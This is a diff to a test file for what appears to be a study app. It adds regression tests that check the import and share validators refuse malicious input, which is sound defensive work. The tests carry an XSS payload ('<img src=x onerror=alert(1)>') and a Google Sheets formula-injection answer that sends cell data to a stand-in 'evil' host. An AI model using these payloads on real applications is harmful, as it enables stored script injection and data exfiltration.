@@ -112,6 +112,17 @@ ok("missing log refused", E.validateExport({ progress: { a: { box: 0, due: 0 } }
 ok("score above 1 refused", E.validateExport({ progress: { a: { box: 0, due: 0, log: [[1, 1, 0, 1.5]] } } }).length === 1);
 ok("not an export refused", E.validateExport({ hello: 1 }).length === 1 && E.validateExport(null).length === 1);
 ok("non-numeric ability refused", E.validateExport({ ...good, model: { theta: { 3: "x" } } }).length === 1);
+// a mine card made in the app imports; one carrying render-routing fields (format/num/choices) is
+// refused -- that is the stored-XSS vector (a crafted num.value reaching an unescaped result line)
+ok("export: a normal mine card imports",
+  E.validateExport({ ...good, mine: [{ id: "mine-1", chapter: "c1", label: "L", q: "Q", a: "A", created: 1 }] }).length === 0);
+ok("export: mine card with a format/num payload refused (XSS)",
+  E.validateExport({ ...good, mine: [{ id: "m1", format: "num", q: "1+1?", a: "2",
+    num: { value: '<img src=x onerror=alert(1)>', unit: "" } }] }).length === 1);
+ok("export: mine card with an unknown field refused",
+  E.validateExport({ ...good, mine: [{ id: "m1", q: "Q", a: "A", choices: [["A", "<img>"]] }] }).length === 1);
+ok("export: mine card with a non-string q refused",
+  E.validateExport({ ...good, mine: [{ id: "m1", q: 5, a: "A" }] }).length === 1);
 
 // rounds: go through everything, summary, today's numbers, mastery groups
 {
@@ -225,6 +236,11 @@ ok("export: v2 files still import", E.validateExport({ schemaVersion: 2, progres
   ok("share: long answer refused", !gs.validRow({ ...mc, answer: "x".repeat(41) }));
   const mixed = gs.acceptedRows({ rows: [mc, { ...flip, install: "1111111111111111" }, { ...essay, right: 2 }] });
   ok("share: one install code per request, invalid rows dropped", mixed.length === 1 && mixed[0] === mc);
+  // V3: a leading "=" answer would run as a Google Sheets formula (=IMAGE exfiltration) -- refused
+  ok("share: formula-injection answer refused", !gs.validRow({ ...mc, answer: '=IMAGE("//evil/"&A1)' }));
+  ok("share: negative-number answer still accepted", gs.validRow({ ...mc, answer: "-5" }));
+  // V4: a global per-window cap exists alongside the per-install cap (rotating install codes bypass that one)
+  ok("share: a global cap is enforced, not only the per-install cap", gs.GLOBAL_CAP > 0 && gs.GLOBAL_CAP < Infinity);
 }
 
 // exam progress (stage A): tiers fixed in advance, no tier without history, sure-but-wrong lifts 穩 to 注意
